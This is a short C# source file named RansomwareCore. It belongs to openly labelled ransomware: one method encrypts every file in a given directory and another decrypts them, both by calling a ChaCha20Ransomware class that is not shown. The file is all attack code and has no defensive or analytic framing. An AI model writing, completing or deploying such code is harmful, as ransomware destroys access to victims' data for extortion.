using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class RansomwareCore
{
    public static void EncryptFiles(string directoryPath, string salt)
    {
        string[] files = Directory.GetFiles(directoryPath);
        foreach (string file in files)
        {
            ChaCha20Ransomware.EncryptFile(file, salt);
        }
    }

    public static void DecryptFiles(string directoryPath, string salt, byte[] key)
    {
        string[] files = Directory.GetFiles(directoryPath);
        foreach (string file in files)
        {
            ChaCha20Ransomware.DecryptFile(file, salt, key);
        }
    }
}